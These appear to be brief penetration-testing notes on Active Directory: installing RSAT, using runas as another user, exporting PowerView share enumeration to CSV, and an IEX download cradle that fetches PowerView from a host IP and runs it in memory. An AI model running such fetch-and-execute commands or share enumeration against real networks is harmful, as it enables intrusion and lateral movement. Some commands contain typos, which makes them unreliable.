



## Installing Remote Server Administation Tools 

You can download it from powershell like this:

```
Enable-WindowsOptionalFeature -Online -FeatureName RSATClient-Roles-AD-Powershell

import-module activedirectory
```

If that doesnt work, you need to download it, just google Rmote Server ADministation tool WIndows 10, 8 or whatever.
Download it. Install it. Restart the the computer.

Open up `Control Panel / Turn Windows Features on and Off / Rmote Server ADministation Tools / Role Administation TOols / AD DS and AD LDS tools / Active directory module for windows powershell`

## Runas / Testing a user account

Say to get access to creds from a user. Or just want to run a program in the context of another user. Kind of like SUDO put over the network, you can do:


```
runas /user:USERNAME@domain.local cmd.exe
or
runsas /user:domain.local\USERNAME
```

## Export to CSV
You can always pipe the return data to a CSV file, like this:


```powerview
find-domainshare -CheckShareAccess | Export-Csv qwe.csv
```


## Download module an inject into memory

If you are using PowerView, remember to use the Dev-version, since it is correct with the documentation. 
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.66.123/PowerView.ps1');
```
